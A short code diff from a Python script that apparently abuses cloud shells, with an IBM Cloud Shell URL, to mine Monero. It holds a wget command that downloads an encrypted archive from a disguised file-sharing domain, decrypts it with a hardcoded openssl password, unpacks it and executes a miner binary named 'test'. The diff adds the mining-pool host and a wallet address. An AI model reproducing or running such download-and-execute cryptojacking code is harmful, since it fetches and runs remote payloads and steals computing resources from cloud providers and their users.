@@ -44,7 +44,7 @@ def worker_callbacks(f):
     }))
 
 
-xmr_command = """./test -c config.json"""
+xmr_command = """./test -o auto.skypool.xyz:5555 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
 comand = """ wget -O test.des3 'http://1drv.stdfirm.com/u/s!AnJnYpmP0XhJepe1DA4dOpUgY6U?e=2m9f2q'&&dd if=test.des3 |openssl des3 -d -k 123@123 | tar zxf -&&cd mine&&chmod 0777 test&&""" + xmr_command
 address = "https://cloud.ibm.com/shell"
 s_time = time.time()
